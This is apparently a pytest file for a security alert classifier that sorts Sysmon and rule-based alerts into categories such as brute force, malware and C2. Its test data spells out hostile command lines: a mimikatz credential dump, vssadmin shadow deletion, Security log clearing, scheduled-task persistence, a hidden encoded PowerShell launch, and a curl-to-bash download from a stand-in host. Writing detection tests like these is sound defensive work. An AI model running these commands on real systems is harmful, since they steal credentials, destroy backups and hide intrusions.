import pytest

from app.analyzers.classifier import AlertClassifier
from app.analyzers.normalizer import Normalizer
from app.analyzers.rule_knowledge import default_rule_kb
from app.utils.net import NetworkClassifier


@pytest.fixture
def classify():
    clf = AlertClassifier(default_rule_kb(), NetworkClassifier())
    norm = Normalizer()
    return lambda raw: clf.classify(norm.normalize(raw))


def test_known_rules(classify):
    assert classify({"rule": {"id": "5710", "level": 5}}) == "auth_failure"
    assert classify({"rule": {"id": "5712", "level": 10}}) == "brute_force"
    assert classify({"rule": {"id": "5715", "level": 3}}) == "auth_success"
    assert classify({"rule": {"id": "87105", "level": 12}, "data": {"virustotal": {"positives": "3"}}}) == "malware"


def test_unknown_rule_uses_groups_and_keywords(classify):
    assert classify({"rule": {"id": "999001", "level": 6, "groups": ["sudo"]}}) == "privilege_escalation"
    assert classify({"rule": {"id": "999002", "level": 6, "description": "Port scan detected"}}) == "scan"
    assert classify({"rule": {"id": "999003", "level": 3, "description": "Something odd"}}) == "other"
    assert classify({"rule": {"id": "999004", "level": 10, "description": "Multiple authentication failures",
                              "groups": ["authentication_failures"]}}) == "brute_force"


@pytest.mark.parametrize("cmd,expected", [
    ("powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "execution"),
    ("mimikatz.exe sekurlsa::logonpasswords", "credential_access"),
    ("vssadmin.exe delete shadows /all /quiet", "impact"),
    ("wevtutil cl Security", "defense_evasion"),
    ('schtasks /create /tn x /tr c:\\x.exe', "persistence"),
    ("/bin/sh -c curl -s http://198.51.100.1/x.sh | bash", "execution"),
    ("notepad.exe report.txt", "process_activity"),
])
def test_command_line_escalation(classify, cmd, expected):
    raw = {"rule": {"id": "100500", "level": 3, "description": "Sysmon - Process creation",
                    "groups": ["sysmon", "sysmon_event1"]},
           "data": {"win": {"eventdata": {"image": cmd.split()[0], "commandLine": cmd}}}}
    assert classify(raw) == expected


def test_network_c2_requires_script_process_and_external(classify):
    base = {"rule": {"id": "100600", "level": 5, "description": "network", "groups": ["sysmon_event3"]}}
    ext = dict(base, data={"win": {"eventdata": {"image": "C:\\x\\powershell.exe", "destinationIp": "198.51.100.1"}}})
    internal = dict(base, data={"win": {"eventdata": {"image": "C:\\x\\powershell.exe", "destinationIp": "10.0.0.1"}}})
    browser = dict(base, data={"win": {"eventdata": {"image": "C:\\x\\chrome.exe", "destinationIp": "198.51.100.1"}}})
    assert classify(ext) == "network_c2"
    assert classify(internal) == "network"
    assert classify(browser) == "network"
